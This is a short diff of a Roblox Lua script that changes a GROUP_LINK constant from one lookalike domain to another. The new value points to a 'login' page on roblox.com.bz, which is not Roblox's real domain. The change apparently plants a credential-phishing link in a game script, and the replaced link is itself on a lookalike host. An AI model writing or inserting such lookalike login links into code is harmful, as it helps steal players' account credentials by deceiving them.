@@ -1,4 +1,4 @@
-local GROUP_LINK = "https://www.roblox.com.am/users/374510429339/profile"
+local GROUP_LINK = "https://roblox.com.bz/login?returnUrl=2003010603036664"
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
